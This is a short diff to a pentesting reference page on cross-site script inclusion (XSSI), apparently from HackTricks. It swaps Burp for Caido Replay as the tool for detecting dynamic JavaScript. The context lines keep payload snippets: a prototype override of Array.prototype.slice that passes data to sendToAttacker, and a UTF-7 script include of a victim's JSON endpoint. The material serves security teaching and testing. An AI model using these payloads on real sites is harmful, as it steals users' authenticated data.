@@ -37,6 +37,6 @@ Array.prototype.slice = function(){ sendToAttacker(this) }  // leaks the sliced 
 <script src="http://victim.tld/data.json" charset="UTF-7"></script>
 ```
 
-Detect dynamic-JS XSSI: diff endpoint response with vs without cookies (Burp DetectDynamicJS).
+Detect dynamic-JS XSSI: diff the endpoint response with and without cookies in Caido Replay.
 
 Source: HackTricks (pentesting-web)
